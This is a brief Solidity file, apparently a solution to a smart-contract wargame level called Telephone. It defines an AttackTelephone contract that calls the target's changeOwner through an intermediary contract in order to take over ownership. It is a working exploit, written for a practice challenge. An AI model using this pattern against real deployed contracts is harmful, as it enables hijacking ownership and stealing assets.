// SPDX-License-Identifier: CC-BY-SA-4.0

pragma solidity ^0.8.0;

abstract contract  Telephone {
    function changeOwner(address _owner) virtual public;
}

contract AttackTelephone {
    Telephone tel;

    constructor (address _tel) { //_tel is the address of the deployed instance of the Telephone contract
        tel = Telephone(_tel);
    }
    
    function attack(address _newOwner) public {
        tel.changeOwner(_newOwner);
    }
}
